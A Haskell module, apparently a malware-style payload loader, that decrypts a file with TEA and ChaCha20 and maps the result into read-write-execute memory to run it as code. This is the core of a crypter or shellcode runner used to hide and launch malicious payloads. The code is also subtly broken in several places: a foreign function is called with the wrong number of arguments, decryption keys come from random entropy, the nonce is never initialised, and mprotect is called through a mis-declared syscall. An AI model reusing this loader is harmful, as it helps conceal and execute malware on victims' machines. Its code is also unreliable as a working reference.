module PayloadManager where

import Foreign.Ptr
import Foreign.C.String
import Foreign.Marshal.Alloc
import Data.ByteString as BS
import Data.ByteString.Internal
import Data.ByteString.Unsafe
import Data.Word
import EntropyHarvester
import Control.Exception
import System.Posix.DynamicLinker

foreign import ccall "chacha20_encrypt" c_chacha20 
    :: Ptr Word8 -> Ptr Word8 -> Ptr Word8 -> Ptr Word8 -> CSize -> IO ()

foreign import ccall "tea_encrypt" c_tea_encrypt
    :: Ptr Word32 -> Ptr Word32 -> CSize -> IO ()

loadEncryptedPayload :: FilePath -> IO (FunPtr ())
loadEncryptedPayload path = do
    encrypted <- BS.readFile path
    entropy <- harvestEntropy

    -- Generate keys from entropy
    let teaKey = entropyToPtr entropy
    let chachaKey = entropyToPtr (entropy `shiftR` 64)

    -- Decrypt payload in stages
    stage1 <- teaDecrypt encrypted teaKey
    stage2 <- chacha20Decrypt stage1 chachaKey

    -- Allocate executable memory
    exeMem <- allocExec (BS.length stage2)
    BS.unsafeUseAsCStringLen stage2 $ \(ptr, len) ->
        copyBytes exeMem ptr len

    -- Return function pointer
    return $ castPtrToFunPtr exeMem

teaDecrypt :: BS.ByteString -> Ptr Word32 -> IO BS.ByteString
teaDecrypt bs keyPtr = unsafeUseAsCStringLen bs $ \(inPtr, len) -> do
    outPtr <- mallocBytes len
    c_tea_encrypt (castPtr outPtr) (castPtr inPtr) keyPtr (fromIntegral len)
    packCStringLen (castPtr outPtr, len)

chacha20Decrypt :: BS.ByteString -> Ptr Word8 -> IO BS.ByteString
chacha20Decrypt bs keyPtr = unsafeUseAsCStringLen bs $ \(inPtr, len) -> do
    noncePtr <- mallocBytes 12
    outPtr <- mallocBytes len
    c_chacha20 keyPtr noncePtr (castPtr inPtr) outPtr (fromIntegral len)
    packCStringLen (castPtr outPtr, len)

allocExec :: Int -> IO (Ptr a)
allocExec size = do
    ptr <- mallocBytes size
    setExecutable ptr size
    return ptr

setExecutable :: Ptr a -> Int -> IO ()
setExecutable ptr size = do
    let pageSize = 4096
    let alignedPtr = ptr `alignPtr` pageSize
    let alignedSize = size + (ptr `minusPtr` alignedPtr)
    _ <- syscallMprotect alignedPtr alignedSize 0x7  -- RWX
    return ()

foreign import ccall "syscall" syscallMprotect 
    :: Ptr a -> Int -> CInt -> IO CInt
    